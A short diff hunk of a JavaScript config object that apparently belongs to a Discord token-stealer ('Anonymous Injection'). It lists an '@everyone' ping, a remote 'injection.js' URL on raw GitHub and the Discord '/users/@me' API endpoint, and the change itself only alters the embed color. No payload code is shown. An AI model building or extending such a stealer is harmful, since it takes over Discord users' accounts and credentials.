@@ -13,7 +13,7 @@ const config = {
   ping_val: '@everyone', 
   embed_name: 'Anonymous Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1076253206700634292/1078971098131087472/image.png', 
-  embed_color: 1005149, 
+  embed_color: 0000000, 
   injection_url: 'https://raw.githubusercontent.com/mishakabatedd/name/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
